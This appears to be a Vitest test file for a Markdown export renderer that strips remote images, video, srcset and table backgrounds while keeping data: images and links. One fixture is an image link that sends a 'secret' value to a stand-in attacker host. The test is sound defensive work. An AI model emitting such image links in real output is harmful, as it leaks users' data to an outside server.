// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { loadExportMarkdownRenderer, loadMarkdownRenderer } from "./markdown";

describe("export Markdown renderer", () => {
  it("removes every remote resource but keeps the text and data: images", async () => {
    const render = await loadExportMarkdownRenderer();
    const html = render(
      [
        "![x](https://attacker.example/p.png?d=secret)",
        '<img src=https://a.example/b><video poster="https://a.example/p" src="//a.example/v"></video><img srcset="https://a.example/1x 1x">',
        "<table background=\"https://a.example/t\"><tr><td>cell</td></tr></table>",
        "![ok](data:image/png;base64,AA)",
        "[a link](https://ok.example/doc)",
      ].join("\n\n"),
    );
    expect(html).not.toMatch(/a\.example|attacker/);
    expect(html).toContain('src="data:image/png;base64,AA"');
    expect(html).toContain('href="https://ok.example/doc"');
    expect(html).toContain("cell");
  });

  it("leaves ordinary text that looks like attributes alone", async () => {
    const render = await loadExportMarkdownRenderer();
    const text = 'The input data = the output of step 2; set src = 0 and background="#fff".\n\n| a | b |\n|---|---|\n| raw data = 5 | x |';
    const html = render(text);
    expect(html).toContain("The input data = the output of step 2; set src = 0 and background=\"#fff\".");
    expect(html).toContain("<td>raw data = 5</td>");
  });

  it("does not change the app's own renderer", async () => {
    await loadExportMarkdownRenderer();
    const render = await loadMarkdownRenderer();
    expect(render("![x](https://example.com/a.png)")).toContain('src="https://example.com/a.png"');
  });
});
